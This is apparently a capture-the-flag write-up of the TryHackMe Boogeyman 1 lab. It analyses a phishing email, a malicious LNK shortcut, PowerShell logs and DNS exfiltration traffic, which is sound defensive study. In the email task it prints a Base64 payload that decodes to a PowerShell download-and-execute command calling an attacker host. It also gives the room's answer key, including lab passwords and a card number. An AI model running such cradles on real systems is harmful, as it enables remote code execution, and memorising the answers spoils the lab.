# Macro-Based Initial Access Analysis - BoogeymanP1

## Objectives

- Trace **Boogeyman** end-to-end TTPs from the phishing email to command execution, C2, and exfiltration.
- Correlate **email**, **PowerShell telemetry (JSON)**, and **PCAP** to attribute activity, artifacts, and IOCs.
- Identify delivered payloads (**LNK**), downloaded tools (**seatbelt**, **sq3.exe**), C2 infra (`cdn.bpakcaging.xyz`, `files.bpakcaging.xyz`), and the **DNS-based exfil** of `protected_data.kdbx`.

## Tools Used

- **VM -** [https://tryhackme.com/room/boogeyman1](https://tryhackme.com/room/boogeyman1)
- **Thunderbird** (EML triage: headers, DKIM/List-Unsubscribe; attachment handling).
- **LNKParse3** (decode `Invoice_20230103.lnk` command line & payload).
- **jq** (timeline & field extraction from `powershell.json`, esp. `ScriptBlockText`).
- **Wireshark / TShark** (HTTP/DNS flows, POST C2, hex chunks, stream rebuild).
- **CyberChef** (Base64/hex decode of payloads and DNS exfil data).
- **Core CLI** (grep/sed/awk/tr/uniq for quick IOC extraction & reconstruction).

---

# [Investigation]

# Task 1: [Introduction] New threat in town.

A **new threat actor** has recently surfaced under the alias **“Boogeyman.”** As part of this investigation, I was tasked to analyze and uncover the tactics, techniques, and procedures (TTPs) executed by this emerging adversary. My objective was to trace Boogeyman’s entire attack chain — from initial access to the achievement of their final objective — using the artefacts provided within the analysis environment.

![image.png](image.png)

## Investigation Setup

To begin the investigation, I deployed the provided **analysis machine** from the TryHackMe environment. After initialization, I gained access to a fully configured workspace that included all the necessary artefacts and tools required for forensic examination.

## Provided Artefacts

The investigation environment included the following artefacts, located in the directory:

`/home/ubuntu/Desktop/artefacts`

| File Name | Description |
| --- | --- |
| **dump.eml** | Copy of the phishing email suspected to have delivered the initial payload. |
| **powershell.json** | PowerShell logs in JSON format extracted from Julianne’s workstation, converted from EVTX using the `evtx2json` tool. |
| **capture.pcapng** | Network packet capture from the same workstation, used to analyze network communication and potential C2 traffic. |

These artefacts served as the foundation for tracing the entire Boogeyman infection chain, correlating endpoint, email, and network activity.

## Tools Available

The virtual machine came pre-equipped with a robust set of forensic and analysis utilities designed to handle email, JSON logs, and network captures.

### **Primary Analysis Tools:**

- **Thunderbird:** Email client used for examining the phishing email structure, headers, and attachments.
- **LNKParse3:** Python-based utility for analyzing `.lnk` shortcut files often used in phishing payload delivery.
- **Wireshark:** GUI-based packet analyzer for inspecting network communications.
- **Tshark:** Command-line version of Wireshark for efficient filtering and data extraction.
- **jq:** Lightweight command-line JSON processor for parsing and filtering PowerShell logs.

### **Built-in Command-Line Utilities:**

- **grep, sed, awk:** for string matching, pattern extraction, and log filtering.
- **base64:** for decoding encoded payloads or commands found in PowerShell scripts or network traffic.

## Objective

The primary goal of this investigation was to **identify and analyze the Boogeyman threat actor’s full operational workflow** — including initial infection vector, execution methods, persistence mechanisms, privilege escalation attempts, and final actions on objectives.

This exercise tested my ability to correlate artefacts across different layers of evidence — email, endpoint, and network — and to construct a clear narrative of the Boogeyman’s tactics within the compromised environment.

With all artefacts and tools ready, I proceeded to begin **hunting the Boogeyman**.

Room Link: https://tryhackme.com/room/boogeyman1

---

# Task 2: [Email Analysis] –  Look at that headers!

The investigation began with analyzing the **phishing email** that initiated the Boogeyman compromise. The targeted recipient, **Julianne**, is a finance employee at **Quick Logistics LLC**. She received what appeared to be a legitimate follow-up email concerning an **unpaid invoice** from their partner company, **B Packaging Inc.** However, the attached document was **malicious** and resulted in the compromise of her workstation upon execution.

![image.png](image%201.png)

Subsequent reports from multiple finance department employees indicated that the same phishing email was distributed across the department, suggesting a **targeted campaign** specifically aimed at Quick Logistics’ finance team.

Upon correlating these findings with known threat intelligence, the **initial TTPs** used in this attack aligned with the methods attributed to the emerging threat group **“Boogeyman”**, a group known for targeting organizations in the **logistics sector**.

## Investigation

- First I opened the email with **Thunderbird**.
    
    ![image.png](image%202.png)
    
- Looks like the attacker has provided the victim with a file to download, and along with password to open it.
    
    ![image.png](image%203.png)
    
- Save the invoice attachment in the computer.
    
    ![image.png](image%204.png)
    
- Then copy the password.
    
    ![image.png](image%205.png)
    
- Then extract the zip file with help of the password.
    
    ![image.png](image%206.png)
    
    ![image.png](image%207.png)
    
- As you can see, the extension of the invoice is **.lnk** which is a windows shortcut file.
    
    ![image.png](image%208.png)
    
- It’s not safe to run any shortcuts when you dont know what the contents of this file are. So let’s open linux terminal and use **Link parse**, it’s a tool which allows us to see the contents of a windows shortcut file without opening it.
    
    ```
    lnk parse Invoice_20230103.lnk
    ```
    
- In the output, looks like some command line argument is taking place.
    
    ![image.png](image%209.png)
    
- After decoding it, we’ll get the following result.
    
    ![image.png](image%2010.png)
    
    This command 
    
    - Creates a new object
    - Downloads a file from that URL.
    
    This URL is a C2 server, command and control. It’s being called by the windows shortcut file as an external communication. 
    

### What is the email address used to send the phishing email?

![image.png](image%2011.png)

Answer: `agriffin@bpakcaging.xyz`

### What is the email address of the victim?

![image.png](image%2012.png)

Answer: `julianne.westcott@hotmail.com`

### What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

- To view the header of the email, I will have to view the source code the email.
    
    ![image.png](image%2013.png)
    
- DKIM-Signature is mentioned twice.
    
    ![image.png](image%2014.png)
    
    But the first domain name is the main domain which was used to send the email, which we already know. The actual answer is the second domain, it’s the 3rd party mail relay service used by the attacker. 
    
    ![image.png](image%2015.png)
    

Answer: `elasticemail`

### What is the name of the file inside the encrypted attachment?

![image.png](image%2016.png)

Answer: `Invoice_20230103.lnk`

### What is the password of the encrypted attachment?

![image.png](image%2017.png)

Answer: `Invoice2023!`

### Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

When we used the **Link parse** tool to view the contents of windows shortcut file.

![image.png](image%2018.png)

Answer: `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==`

---

# Task 3: [Endpoint Security] – Are I sure that’s an invoice?

Based on my initial findings, I confirmed how the malicious attachment compromised Julianne’s workstation:

- A **PowerShell command** was executed.
- **Decoding the payload** revealed the starting point of the endpoint activities.

## JQ Cheatsheet

I have to use `jq`, a lightweight and flexible command-line JSON processor, often combined with other text-processing commands. I ensured I was familiar with the fields present in each log entry before filtering.

- **Parse all JSON into beautified output**
    
    ```bash
    cat powershell.json | jq
    ```
    
- **Print all values from a specific field (without printing the field name)**
    
    ```bash
    cat powershell.json | jq '.Field1'
    ```
    
- **Print all values from a specific field (as key-value)**
    
    ```bash
    cat powershell.json | jq '{Field1}'
    ```
    
- **Print values from multiple fields**
    
    ```bash
    cat powershell.json | jq '{Field1, Field2}'
    ```
    
- **Sort logs based on their Timestamp**
    
    ```bash
    cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'
    ```
    
- **Sort logs by Timestamp and print multiple field values**
    
    ```bash
    cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {Field}'
    ```
    

## Investigation

- I will have to analyze the `powershell.json` file for this.
    
    ![image.png](image%2019.png)
    
- Run a terminal and use the following command to sort logs based on their Timestamp:
    
    ```
    cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]'
    ```
    
    ![image.png](image%2020.png)
    
    But the result is too messy. 
    
    Since this is a powershell log, the field we are most interested in is the `{ScriptBlockText}` field. Fortunately there’s a way to extract just the specific field values from this entire log.
    
    ![image.png](image%2021.png)
    
    Command I ran:
    
    ```
    cat powershell.json | jq -s -c ‘sort_by(.Timestamp) | .[]’ | jq ‘{ScriptBlockText}’
    ```
    
    ![image.png](image%2022.png)
    
    It extracted all the contents of the script block text field, but lets sort it and remove the duplicates from result to make the output more readable.
    
    Command I ran:
    
    ```
    cat powershell.json | jq -s -c ‘sort_by(.Timestamp) | .[]’ | jq ‘{ScriptBlockText}’ | sort | uniq
    ```
    
    ![image.png](image%2023.png)
    
    This will give output in a descending order, so top ones are the latest commands. These are basically the commands ran by the email attachment (**.lnk** file) when it was opened by the victim.
    
    This log contains all the necessary details for answering the questions.
    

### What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)

![image.png](image%2024.png)

![image.png](image%2025.png)

Answer: `cdn.bpakcaging.xyz,files.bpakcaging.xyz`

### What is the name of the enumeration tool downloaded by the attacker?

![image.png](image%2026.png)

It’s a tool popularly used for enumeration.

![image.png](image%2027.png)

Answer: `seatbelt`

### What is the file accessed by the attacker using the downloaded **sq3.exe** binary? Provide the full file path with escaped backslashes.

![image.png](image%2028.png)

Answer: `C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`

### What is the software that uses the file in Q3?

![image.png](image%2029.png)

Answer: `Microsoft Sticky Notes`

### What is the name of the exfiltrated file?

![image.png](image%2030.png)

Answer: `protected_data.kdbx`

### What type of file uses the .kdbx file extension?

![image.png](image%2031.png)

Answer: `keepass`

### What is the encoding used during the exfiltration attempt of the sensitive file?

![image.png](image%2032.png)

Answer: `hex`

### What is the tool used for exfiltration?

![image.png](image%2033.png)

This tool is used to exfiltrate data.

Answer: `nslookup`

---

# Task 4: [Network Traffic Analysis] – They Got Us. Call the Bank Immediately!

Based on the **PowerShell log investigation**, I was able to confirm the **full impact of the Boogeyman attack** on Julianne’s workstation. The findings revealed that the **threat actor successfully accessed and exfiltrated two potentially sensitive files**. Additionally, I identified the **domains and ports** used during the data exfiltration, along with the **specific tool** leveraged by the attacker to perform this operation.

## Investigation Guide

To finalize the investigation, I focused on analyzing the **network traffic** generated during the attack. The goal was to fully understand how the exfiltration occurred and reconstruct the attacker’s activity by correlating it with previously collected PowerShell data.

## Investigation

- I opened the packet capture file with Wireshark to analyze the packets which were captured during the attack.
    
    ![image.png](image%2034.png)
    

### What software is used by the attacker to host its presumed file/payload server?

- From the previous task, I found the domain which the attacker uses:
    
    ![image.png](image%2035.png)
    
    Domain: `bpakcaging.xyz`
    
    For hosting: `files.bpakcaging.xyz`
    
- Let’s filter the packets in wireshark for this particular domain.
    
    ```
    http contains “files.bpakcaging.xyz"
    ```
    
    ![image.png](image%2036.png)
    
    It narrowed the packets down to 5.
    
- Let’s look at the first packet:
    
    ![image.png](image%2037.png)
    
    ![image.png](image%2038.png)
    

Answer: `python`

### What HTTP method is used by the C2 for the output of the commands executed by the attacker?

- Click on the upward arrow to go to next packet.
    
    ![image.png](image%2039.png)
    
    ![image.png](image%2040.png)
    

Answer: `POST`

### What is the protocol used during the exfiltration activity?

Discovered during the previous task where I noticed that the DNS lookup was used to exfiltrate.

Answer: `dns`

### What is the password of the exfiltrated file?

- In the previous task, when I ran the `jq` processor to read the contents of **ScriptBlockText** field inside the `powershell.json` file. I observed:
    
    ![image.png](image%2041.png)
    
    - Database `plum.sqlite` was accessed.
    - And then the attacked used a SQL command to retrieve some records, which probably contained the password. Which the attacker used to open the protected file:
        
        ![image.png](image%2042.png)
        
- Let’s filter the packets for the tool `sq3.exe` which was used by the attacker to access the database which contained the password.
    
    ![image.png](image%2043.png)
    
- Let’s investigate the first packet:
    
    ![image.png](image%2044.png)
    
    ![image.png](image%2045.png)
    
- Now lets change stream to the next packet (to 750) to see what happens to the data exfiltrated.
    
    ![image.png](image%2046.png)
    
- Now let’s decode this from decimal, using Cyberchef:
    
    ![image.png](image%2047.png)
    
    Just match the columns and then you’ll find out what the **Master Password** is:
    
    ![image.png](image%2048.png)
    

Answer: `%p9^3!lL^Mz47E2GaT^y`

### What is the credit card number stored inside the exfiltrated file?

- Open **TShark** in terminal, and run the following command:
    
    ```
    tshark -r capture.pcapng -Y ‘dns’ -T fields -e dns.qry.name | grep “.bpakcaging.xyz”
    ```
    
    ![image.png](image%2049.png)
    
    This is the output which contains the main domain, and what’s being exfiltrated, but all is encoded.  
    
- So I need to extract the encoded data from the output, but before that I need to remove the unneccesary data by adding this in my previous command `| cut -f1 -d "."`
    
    ```
    tshark -r capture.pcapng -Y ‘dns’ -T fields -e dns.qry.name | grep “.bpakcaging.xyz” | cut -f1 -d "." 
    ```
    
    ![image.png](image%2050.png)
    
    Now I have the isolated data which was exfiltrated, but I still need to remove few unnecessary stuffs from here, like spaces, newlines, and the text “cdn”, etc.
    
- Add this to the previous command`| grep -v -e "files" - e "cdn"` to remove the files and cdn subdomains.
    
    ```
    tshark -r capture.pcapng -Y ‘dns’ -T fields -e dns.qry.name | grep “.bpakcaging.xyz” | cut -f1 -d "." | grep -v -e "files" -e "cdn"
    ```
    
    And then add `| uniq` to get rid of the duplicates.
    
    ```
    tshark -r capture.pcapng -Y ‘dns’ -T fields -e dns.qry.name | grep “.bpakcaging.xyz” | cut -f1 -d "." | grep -v -e "files" -e "cdn" | uniq
    ```
    
    ![image.png](image%2051.png)
    
- Now add this to the previous command to cancel out new lines `| tr -d '\\n'`:
    
    ```
    tshark -r capture.pcapng -Y ‘dns’ -T fields -e dns.qry.name | grep “.bpakcaging.xyz” | cut -f1 -d "." | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n'
    
    ```
    
    ![image.png](image%2052.png)
    
- Now to save this in an output file, add this to the previous command `> out.txt`:
    
    ```
    tshark -r capture.pcapng -Y ‘dns’ -T fields -e dns.qry.name | grep “.bpakcaging.xyz” | cut -f1 -d "." | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' > out.txt
    ```
    
    ![image.png](image%2053.png)
    
    And now I have the isolated exfiltrated data.
    
- Copy the encoded data and decode it with Cyberchef with operation set as `From Hex`.
    
    ![image.png](image%2054.png)
    
    And then save it as `protected_data.kdbx`
    
    ![image.png](image%2055.png)
    
    ![image.png](image%2056.png)
    
- Now open it using the retrieved password from the previous question.
    
    ![image.png](image%2057.png)
    
    ![image.png](image%2058.png)
    
    Then look around the details of the **Company Card**, and you’ll find the number.
    

Answer: `4024007128269551`

---

# Lessons Learned

- **Initial Access:** Encrypted ZIP + **LNK** shortcut launched PowerShell to fetch from attacker infra—email branding + passworded archives still bypass users.
- **Execution & Tooling:** Download-execute pattern with commodity tools (**seatbelt**, **sq3.exe**); data staging from app stores (Sticky Notes `plum.sqlite`) and password vaults (**KeePass .kdbx**).
- **C2 & Hosting:** Attacker hosted payloads on **Python HTTP server**; C2 used **HTTP POST** and simple Base64—easy to fingerprint with UA/method/paths.
- **Exfiltration:** **DNS tunneling via `nslookup`** with **hex-encoded** blobs is low-tech but effective—must monitor egress DNS length/patterns and query rates.
- **Detection Priorities:** Log **PowerShell Script Block** (Constrained/AMSI), enable **Sysmon** for process/file/DNS, and alert on LOLBins (`certutil`, `powershell`, `nslookup`) with network IOCs.
- **Email Controls:** Enforce **DKIM/SPF/DMARC**, sandbox archives, and flag **Elastic Email**/similar relays when mismatched with sender domain.
- **Response Playbook:** On match—block `.bpakcaging.xyz`, isolate host, extract PowerShell/PCAP, reconstruct exfil, rotate credentials, and hunt for persistence across finance endpoints.

# Socials

**Repository:** https://github.com/RahulCyberX/SOC-Analyst-Portfolio/

**Medium Article:** https://rahulcyberx.medium.com/threat-investigation-boogeyman-1-soc-level-1-capstone-challenge-thm-d5da9bb63a9d?source=friends_link&sk=8540e5729df0b845d1478cf33221dca8

**TryHackMe Profile:** https://tryhackme.com/p/0xRahuL

**Github Profile:** https://github.com/RahulCyberX
